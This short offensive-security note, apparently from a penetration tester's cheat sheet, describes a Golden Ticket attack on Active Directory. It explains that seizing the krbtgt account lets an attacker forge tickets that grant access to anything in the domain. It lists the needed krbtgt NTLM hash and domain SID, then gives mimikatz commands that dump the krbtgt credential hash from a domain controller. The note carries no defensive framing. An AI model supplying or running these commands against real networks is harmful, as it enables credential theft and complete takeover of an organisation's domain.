-- -
This is taking over the Kerberos Ticket Granting Ticket #krbtgt, which is the service that grants tickets to every resource and service in the domain, so you are creating a ticket that has access to anything on the domain, meaning we can use it to do whatever we want on the domain. 
#### Requirements
1. #krbtgt NTLM hash
2. Domain SID
#### mimikatz
```
privilege::debug
lsadump::lsa /inject /name:krbtgt
```